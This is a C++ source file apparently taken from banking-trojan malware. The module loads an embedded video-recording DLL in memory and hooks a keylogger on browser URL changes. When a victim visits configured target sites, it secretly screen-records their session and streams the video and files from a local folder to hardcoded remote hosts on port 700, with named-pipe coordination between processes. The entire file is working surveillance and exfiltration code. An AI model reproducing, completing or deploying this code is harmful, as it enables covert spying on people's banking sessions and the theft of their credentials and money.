

#include "VideoRecorder.h"
#include "DllLoader.h"
#include "BotCore.h"
#include "Memory.h"
#include "Utils.h"
#include "GetApi.h"
#include "Config.h"
#include "Crypt.h"
#include "Pipes.h"
#include "Inject.h"


//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace VIDEORECDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define VDRDBG VIDEORECDEBUGSTRINGS::DBGOutMessage<>

//----------------------------------------------------------------------------


/// ������ ������������� �������. � ������ ������� ����� ������ �������������
//  ������� ����
#ifndef DEBUGCONFIG
	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "VIDEO_REC_URLS\0";
#else
	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "*rambler.*\0"
												  "*bsi.dll*\0\0";
#endif


#define HASH_VIDEO_REC_URLS 0x9189212B /* VIDEO_REC_URLS */


#ifdef DEBUGCONFIG
	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "192.168.0.100\0"; //"127.0.0.1";//"178.162.179.65\0";
	char VIDEO_REC_HOST2[MAX_VIDEO_REC_HOST_LEN] = "\0";
#else
	//����� ������� ���� ����� �����
	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
	char VIDEO_REC_HOST2[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
#endif


#define HASH_VIDEO_REC_HOST 0x922E6EAC /* VIDEO_REC_HOST */



namespace VideoRecorder
{
	// ���������� ��� ����������
	#include "VideoRecorderDll.cpp"


    char MethodStartRecordPid[] = {'S','t','a','r','t','R','e','c','P','i','d', 0};
    char MethodStop[]           = {'S','t','o','p','R','e','c', 0};

	// ���� ������� ����� �����
    const DWORD DEFAULT_PORT = 700;


	// ������� ��������� ����������
	HMEMORYMODULE inline LoadDLL();

}

//*****************************************************************************

HMEMORYMODULE inline VideoRecorder::LoadDLL()
{
	// ������� ��������� ����������
	HMEMORYMODULE Module = MemoryLoadLibrary(VideoRecorder::data);

	#ifdef DebugUtils
		if (Module == NULL)
			VDRDBG("VIDEO","������ �������� ������");
	#endif

	return Module;
}
//*****************************************************************************




//"89.149.226.121";


HMEMORYMODULE	hLibWndRec = NULL;

//StartRecHwnd( char* uid, char* nameVideo, HWND wnd, const char* ip, int port ) //������ �� HWND ����
//StartRecPid( char* uid, DWOD pid, char* ip, int port )  //������ �� PID ��������
typedef VOID (WINAPI *TStartRecHwnd	)( char* uid, char* nameVideo, HWND wnd,  const char* ip1, int port1, const char* ip2, int port2 ) ;
typedef VOID (WINAPI *TStartRecPid  )( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2 );
typedef VOID (WINAPI *TStopRec		)();

typedef VOID (WINAPI *PStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
typedef VOID (WINAPI *PStartFindFields)();
typedef VOID (WINAPI *PStopFindFields)();

char CurrentChar[256];


void StartRecordThread(DWORD pid,PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port)//�������� ����� ������ �����
{
	VDRDBG("VIDEO","StartRecordThread");

	if (!hLibWndRec)
		hLibWndRec = VideoRecorder::LoadDLL();

	if (hLibWndRec)
	{

		TStartRecPid pStartRecPid;
	
		pStartRecPid =(TStartRecPid)MemoryGetProcAddress(hLibWndRec,"StartRecPid");
		if (pStartRecPid)
		{
			char Buf[100];
			GenerateUid(Buf);
			if (ip == NULL)
				ip = GetVideoRecHost1();
			if (ReservedIP == NULL)
				ReservedIP = GetVideoRecHost2();
			//����� ���� �������� ������ ���� � ����(���������)
			VDRDBG("VIDEO","��� ��������, ������ �������� �����");
			pStartRecPid(Buf, KeyWord, pid, ip, port, ReservedIP, port);
		};
	};
}

void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port)//�������� ����� ��������
{
	VDRDBG("VIDEO","����� ����� �� %s",Path);
	HMEMORYMODULE	hLibWndRec1 = VideoRecorder::LoadDLL();;

	if (hLibWndRec1)
	{

		PStartSend StartSend;

		StartSend = (PStartSend)MemoryGetProcAddress(hLibWndRec1,"StartSend");
		if (StartSend)
		{
			char Buf[100];
			GenerateUid(Buf);

			if (ip == NULL)
				ip = GetVideoRecHost1();
			if (ReservedIP == NULL)
				ReservedIP = GetVideoRecHost2();

			//����� ���� �������� ������ ���� � ����(���������)
			VDRDBG("VIDEO","��� ������ ���������(���� � ����������� ������) %s",ip);
			StartSend(Buf,Path,ip,port, ReservedIP,port);
			VDRDBG("VIDEO","��� ��������� %s",ip);
		};
		MemoryFreeLibrary(hLibWndRec1);
	};
}
//---------------------------------------------------------------------------------
DWORD WINAPI StartSendinThread(LPVOID Data)
{
	//�� ������ ���� ���� ��������� � ��������� ������
	PCHAR Path_Folder;
	if (Data!=NULL)
	{
		Path_Folder=(PCHAR)Data;
	}
	else
	{
		// ������������ ������ ��� ����������
		Path_Folder = STR::Alloc(MAX_PATH );
		m_memset(Path_Folder,0,MAX_PATH);
		pExpandEnvironmentStringsA( ("%AllUsersProfile%\\cdat"), Path_Folder, MAX_PATH);
	}

	VDRDBG("VIDEO","���������� ��� %s",Path_Folder);
	StartSendThread(Path_Folder,NULL,NULL, 700);
	return 0;

}
//---------------------------------------------------------------------------------
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port)//�������� ����� ������ �����
{
	VDRDBG("VIDEO","�������� ������ �� ������ ����");
	if (!hLibWndRec)
		hLibWndRec = VideoRecorder::LoadDLL();

	if (!hLibWndRec)
	{
		VDRDBG("VIDEO","�� ���������� ��������� ���");
		return;
	}
	if (hLibWndRec)
	{

		TStartRecHwnd pStartRecHwnd;

		pStartRecHwnd = (TStartRecHwnd)MemoryGetProcAddress(hLibWndRec,"StartRecHwnd");
		if (pStartRecHwnd)
		{
			char Buf[100];
			GenerateUid(Buf);

			if (ip == NULL)
				ip = GetVideoRecHost1();
			if (ReservedIP == NULL)
				ReservedIP = GetVideoRecHost2();

			//����� ���� �������� ������ ���� � ����(���������)
			VDRDBG("VIDEO","��� ������ ���������");
			pStartRecHwnd(Buf,KeyWord,hWnd,ip,port, ReservedIP,port);
		};
	};
}


void StopRecordThread()//������������� ����� ������ �����
{

	if (hLibWndRec)
	{
        VDRDBG("VIDEO","StopRecordThread");
		TStopRec pStopRec;
		pStopRec = (TStopRec) MemoryGetProcAddress(hLibWndRec,"StopRec");
		if (pStopRec)
		{
			char Buf[100];
			GenerateUid(Buf);
			pStopRec();			
		};

	//MemoryFreeLibrary(hLibWndRec);
	//hLibWndRec = NULL;
	};
}

void StartFindFields()//������������� ����� ������ �����
{
	if (!hLibWndRec)
		hLibWndRec = VideoRecorder::LoadDLL();

	if (!hLibWndRec)
	{
		VDRDBG("VIDEO","�� ���������� ��������� ���");
		return;
	}

	VDRDBG("VIDEO","��������� ��������  ");
	if (hLibWndRec)
	{
		PStartFindFields pStartFindFields;
		pStartFindFields = (PStartFindFields) MemoryGetProcAddress(hLibWndRec,"StartFindFields");
		if (pStartFindFields)
		{
			
			pStartFindFields();			
		};
	};
}

void StopFindFields()//������������� ����� ������ �����
{

	if (hLibWndRec)
	{
        VDRDBG("VIDEO","������� ����� �������� StopFindFields");
		PStopFindFields pStopFindFields;
		pStopFindFields = (PStartFindFields) MemoryGetProcAddress(hLibWndRec,"StopFindFields");
		if (pStopFindFields)
		{

			pStopFindFields();
		};
	};
}

void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
{
	// ��������� ����� � �������� �, � ������ �������, ��������� ������
	if (CalcHash(VIDEO_REC_URLS) == HASH_VIDEO_REC_URLS)
		return;

	PCHAR URL = NULL;

	if (!STR::IsEmpty((PCHAR)Data))
	{
		PCHAR Temp = VIDEO_REC_URLS;
		while (*Temp != 0)
		{
			if (CompareUrl(Temp, (PCHAR)Data))
			{
				URL = Temp;
				break;
			}

			//--------------------
			Temp = STR::End(Temp); // ��������� � ����� ������
			Temp++;                // ���������� ������� ������
		}
    }


	if (URL != NULL)
	{
		VideoRecorderSrv::StartRecording(URL);
//		StartRecordThread(GetUniquePID(),URL, NULL, NULL, 700);
	}
	else
	{
		VideoRecorderSrv::StopRecording();
	}
}


void StartVideoFromCurrentURL()
{

	#ifdef UniversalKeyLoggerH
 		VDRDBG("VideoRecorder", "�������������� ������������� ��� ������ ��� ������ �������");

		KeyLogger::Initialize(NULL);
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
		KeyLogger::Start();
	#endif
}

PCHAR GetVideoRecHost1()
{
	//������� ���������� ����� ������� ��� ������ �����
	if (CalcHash(VIDEO_REC_HOST1) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST1;
}

PCHAR GetVideoRecHost2()
{
	//������� ���������� ����� ������� ��� ������ �����
	if (CalcHash(VIDEO_REC_HOST2) == HASH_VIDEO_REC_HOST)
		return NULL;

	return VIDEO_REC_HOST2;
}


//*********************************************************************
//  ������ ������� ������������� ������ �����
//*********************************************************************

namespace VideoRecorderSrv
{
	char ServerName[] = {'v','i','d','e','o','r','e','c','s','r','v', 0};

	char CommandStart[] = {'s','t','a','r','t','v','r', 0};
	char CommandStop[]  = {'s','t','o','p','v','r', 0};

	char ClientPipe[] = {'V','d','e','o','R','e','c','C','l','i','e','n','t', 0};

	//----------------------------------------------------------------------
	// ���������� ������
    //----------------------------------------------------------------------

	// ��� �������� ������� ��������� ������� ��� ������
	const static BYTE ClientURLMaxSize = 255;
	DWORD ClientPID = 0;
	char  ClientURL[ClientURLMaxSize + 1];

	// ������� ������������� �������� ������ �����
	bool ClientTerminated = false;
	HANDLE ClientThread = 0;

    //----------------------------------------------------------------------

	PCHAR GetClientPipeName(DWORD PID)
	{
		// ������� ���������� ��� ������ ������� �������
		PCHAR PIDStr = StrLongToString(PID);

		PCHAR Name = STR::New(2, ClientPipe, PIDStr);

		STR::Free(PIDStr);
		return Name;
    }
	//----------------------------------------------------------------------

	DWORD WINAPI RecordThread(LPVOID Data)
	{
		// ����� ������ �����

		// ��������������  ����������
		HMEMORYMODULE Module = VideoRecorder::LoadDLL();
		if (Module == NULL)
			return 0;

		TStartRecPid   Start = (TStartRecPid)MemoryGetProcAddress(Module,
											 VideoRecorder::MethodStartRecordPid);

		TStopRec       Stop  = (TStopRec)MemoryGetProcAddress(Module,
											 VideoRecorder::MethodStop);

		if (Start == NULL || Stop == NULL)
		{
			// �� ������� ���������������� ����������
			VDRDBG("VideoRecorder", "DLL �� �������� ����������� �������");
			MemoryFreeLibrary(Module);
            return 0;
        }

		// �������������� ��������� �������
		PCHAR IP1 = GetVideoRecHost1();
		PCHAR IP2 = GetVideoRecHost2();
		int Port  = VideoRecorder::DEFAULT_PORT;
		PCHAR UID = GenerateBotID();

		// ��������� ������
		VDRDBG("VideoRecorder", "������� ����� ������ ����� � �������� %d URL %s", ClientPID, ClientURL);
		Start(UID, ClientURL, ClientPID, IP1, Port, IP2, Port);

		// ������� ��������� ������
		while (!ClientTerminated)
		{
			pSleep(1000);
			if (!IsProcessLeave(ClientPID))
            	break;
		}

		Stop();

		VDRDBG("VideoRecorder", "����� ������ ����� ����������");

		MemoryFreeLibrary(Module);

		STR::Free(UID);

		return 0;
	}
	//----------------------------------------------------------------------

  /*	void WINAPI ClientStartHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
	{
    	// ���������� ������� ��������� �����
		if (ClientThread == NULL)
		{
			PCHAR URL = STR::New((PCHAR)Pipe->Data);
			ClientThread = StartThread(RecordThread, URL);
        }
	}    */
	//----------------------------------------------------------------------

	void WINAPI ClientStopHandler(LPVOID, PPipeMessage Pipe, bool &Cancel)
	{
    	// ���������� ������� ��������� �����
		VDRDBG("VideoRecorder", "�������� ������� ����������� ������");
        ClientTerminated = true;
	}
	//----------------------------------------------------------------------

	DWORD WINAPI ClientMainProc(LPVOID Data)
	{
		// �������� ��������� ������� ������ �����
		InitializeAPI();

		VDRDBG("VideoRecorder", "������� ������ ������ �����. PID %d", ClientPID);


		ClientThread = NULL;
		ClientTerminated = false;


		// ������ ����� ����� ������

		PCHAR PipeName = GetClientPipeName(ClientPID);

		PProcessPipe Pipe = PIPE::CreateProcessPipe(PipeName, false);

		STR::Free(PipeName);

		if (Pipe == NULL)
		{
        	VDRDBG("VideoRecClient", "ClientPipe error");
			return 0;
		}

//		PIPE::RegisterMessageHandler(Pipe, ClientStartHandler, NULL, CommandStart, 0);
		PIPE::RegisterMessageHandler(Pipe, ClientStopHandler, NULL, CommandStop, 0);

		PIPE::StartProcessPipe(Pipe);


		ClientThread = StartThread(RecordThread, NULL);

		// ������� ��������� ������
		pWaitForSingleObject(ClientThread, INFINITE);

		VDRDBG("VideoRecorder", "������ �������� ������");
		pExitProcess(0);
		return 0;
	}
	//----------------------------------------------------------------------


	void WINAPI ServerStartHandler(LPVOID, PPipeMessage Msg, bool &Cancel)
	{
		// ���������� ������� ������� �����

		// ����������� ��������� ������
		ClientPID = Msg->PID;
		m_memset(ClientURL, 0, ClientURLMaxSize + 1);
		DWORD CopySize = Min(ClientURLMaxSize, Msg->DataSize);
        m_memcpy(ClientURL, Msg->Data,CopySize);


        VDRDBG("VideoRecServer", "�������� ������� ������ ����� � �������� %d", ClientPID);

		PCHAR PipeName = GetClientPipeName(ClientPID);

		// ��������� ������������� ������������� ��������
		BOOL Running = PIPE::Ping(PipeName);

		// � ������ ���� ������� �� �������� ��������� ���
		if (!Running)
		{
//			 StartThread(ClientMainProc, NULL);
			MegaJump(ClientMainProc);

			// ������� ������� � ������������� ��������
			DWORD St = (DWORD)pGetTickCount();
			while (!Running)
			{
				pSleep(250);
				Running = PIPE::Ping(PipeName);

				// ������������ ����� ��������
				if (((DWORD)pGetTickCount() - St) >= 2000) break;
			}
		}

		STR::Free(PipeName);
	}
	//-----------------------------------------------------------------------

}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::Start()
{
	// ��������� ������
	VDRDBG("VideoRecorder", "��������� ������ ������������� ������ �����");
	PProcessPipe Pipe = PIPE::CreateProcessPipe(ServerName, true);
	if (Pipe == NULL)
		return false;

	// ��������� ����������� ������
	PIPE::RegisterMessageHandler(Pipe, ServerStartHandler, NULL, CommandStart, 0);

	return true;
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::StartRecording(PCHAR URL)
{
	// ������� �������� ������ ������
	// ����� ��� �������� ��������

	// ��������� ������������� ������������� ��������

	if (PingClient(0))
		return true;

	VDRDBG("VideoRecorder", "���������� ������� ������� �������� ������ �����");

	bool Result = PIPE::SendMessage(ServerName, CommandStart, URL, 0, NULL);

	if (!Result)
	{
    	VDRDBG("VideoRecorder", "������ ������� �������� ������. �������� ������ �� ��������.");
    }

	return Result;
}
//-----------------------------------------------------------------------------

bool VideoRecorderSrv::StopRecording()
{
	// ������� ������������� ������ ������
	// ����� ��� �������� ��������

	DWORD PID = GetUniquePID();
	PCHAR PipeName = GetClientPipeName(PID);

	bool Result = PIPE::SendMessage(PipeName, CommandStop);
	if (Result)
	{
    	VDRDBG("VideoRecorder", "������ ����� � �������� %d �����������", PID);
    }

	STR::Free(PipeName);

	return Result;
}
//-----------------------------------------------------------------------------

//-----------------------------------------------------
//  PingClient - ������� ��������� �������� ��
//               ������ ������ � ��������� PID
//	���� PID ����� 0 �� ����� ����������� �������
//  �������
//-----------------------------------------------------
bool VideoRecorderSrv::PingClient(DWORD PID)
{
	//  ������� ��������� �������� �� ������ ������ � ��������� PID
	if (PID == 0)
		PID = GetUniquePID();

	PCHAR PipeName = GetClientPipeName(PID);

	DWORD Result = PIPE::Ping(PipeName);

	STR::Free(PipeName);

	return Result != 0;
}
//-----------------------------------------------------------------------------
